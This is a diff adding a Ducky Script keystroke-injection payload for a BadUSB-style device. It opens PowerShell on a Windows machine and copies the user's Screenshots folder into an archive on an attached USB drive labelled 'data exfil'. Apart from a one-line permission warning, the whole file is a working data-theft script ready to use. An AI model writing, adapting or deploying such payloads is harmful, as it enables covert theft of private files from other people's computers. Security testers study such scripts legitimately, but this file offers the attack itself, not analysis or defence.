@@ -1,0 +1,16 @@
+REM
+REM Title: Windows Screenshot File Export to USB Storage Device.
+REM Author: EVXN.
+REM WARNING: ONLY USE ON HARDWARE YOU HAVE PERMISSION TO ACCESS! 
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 300
+ENTER 
+REM Where it says "F:\data exfil" is where your Destination Path Goes. 
+DELAY 500
+STRING Get-ChildItem -Path "$env:USERPROFILE\Pictures\Screenshots" |
+STRING  Compress-Archive -DestinationPath "F:\data exfil" -Update  
+DELAY 1500
+ENTER
